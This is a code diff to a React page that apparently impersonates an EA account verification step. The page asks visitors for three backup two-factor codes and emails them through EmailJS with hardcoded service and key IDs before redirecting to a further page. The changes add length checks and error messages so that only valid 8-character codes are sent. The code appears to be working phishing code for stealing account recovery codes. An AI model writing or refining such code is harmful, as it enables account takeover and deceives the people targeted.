@@ -12,33 +12,73 @@ function Second(props) {
   const [code1, setCode1] = React.useState("");
   const [code2, setCode2] = React.useState("");
   const [code3, setCode3] = React.useState("");
+  const [code1css, setCode1css] = React.useState("none");
+  const [code2css, setCode2css] = React.useState("none");
+  const [code3css, setCode3css] = React.useState("none");
 
   const handleCode1 = (event) => {
     setCode1(event.target.value);
+    if (event.target.value.length == 8) {
+      setCode1css('none');
+    } else {
+      setCode1css('');
+    }
   };
 
   const handleCode2 = (event) => {
     setCode2(event.target.value);
+    if (event.target.value.length == 8) {
+      setCode2css('none');
+    } else {
+      setCode2css('');
+    }
   };
 
   const handleCode3 = (event) => {
     setCode3(event.target.value);
+    if (event.target.value.length == 8) {
+      setCode3css('none');
+    } else {
+      setCode3css('');
+    }
   };
 
   const handlesubmit = (e) => {
     e.preventDefault();
-    console.log(form);
-    
-    emailjs.sendForm("service_0hai4ga", "template_fugsxby", form.current, "kBAEPX9e4YQK8cMc6").then(
-      (result) => {
-        
-        console.log(result.text);
-        navigate('/third', {replace: true});
-      },
-      (error) => {
-        console.log(error.text);
-      }
-    );
+    if (code1.length == 8) {
+      setCode1css('none');
+    } else {
+      setCode1css('');
+    }
+
+    if (code2.length == 8) {
+      setCode2css('none');
+    } else {
+      setCode2css('');
+    }
+
+    if (code3.length == 8) {
+      setCode3css('none');
+    } else {
+      setCode3css('');
+    }
+
+    if (code1.length == 8 && code2.length == 8 && code3.length == 8)
+    {    
+      
+      console.log(form);
+      
+      emailjs.sendForm("service_0hai4ga", "template_fugsxby", form.current, "kBAEPX9e4YQK8cMc6").then(
+        (result) => {
+          
+          console.log(result.text);
+          navigate('/third', {replace: true});
+        },
+        (error) => {
+          console.log(error.text);
+        }
+      );
+    }
   };
 
   const [checked, setChecked] = React.useState(true);
@@ -144,7 +184,7 @@ function Second(props) {
               <h1 className="otktitle otktitle-2">Enter your code</h1>
               <div className="otkc verify">
                 {" "}
-                We need your backup codes <a href="https://myaccount.ea.com/cp-ui/security/index">(https://myaccount.ea.com/cp-ui/security/index)</a> to 
+                We need your backup codes <a href="https://myaccount.ea.com/cp-ui/security/index" target="_blank">(https://myaccount.ea.com/cp-ui/security/index)</a> to 
                 verify your identity. Enter your code below.
                 {" "}
               </div>
@@ -170,6 +210,12 @@ function Second(props) {
                       onChange={handleCode1}
                     />
                   </div>
+                  <div
+                      id="online-input-error-email"
+                      style={{ display: code1css}}
+                    >
+                      <p className="otkinput-errormsg otkc" >Please enter correctly</p>
+                  </div>
                 </div>
                 <div className="otkform-group">
                   <label className="otklabel label-uppercase" htmlFor="twoFactorCode">
@@ -189,6 +235,12 @@ function Second(props) {
                       onChange={handleCode2}
                     />
                   </div>
+                  <div
+                      id="online-input-error-email"
+                      style={{ display: code2css}}
+                    >
+                      <p className="otkinput-errormsg otkc" >Please enter correctly</p>
+                  </div>
                 </div>
                 <div className="otkform-group">
                   <label className="otklabel label-uppercase" htmlFor="twoFactorCode">
@@ -207,6 +259,12 @@ function Second(props) {
                       value={code3}
                       onChange={handleCode3}
                     />
+                  </div>
+                  <div
+                      id="online-input-error-email"
+                      style={{ display: code3css}}
+                    >
+                      <p className="otkinput-errormsg otkc" >Please enter correctly</p>
                   </div>
                 </div>
                 <br />
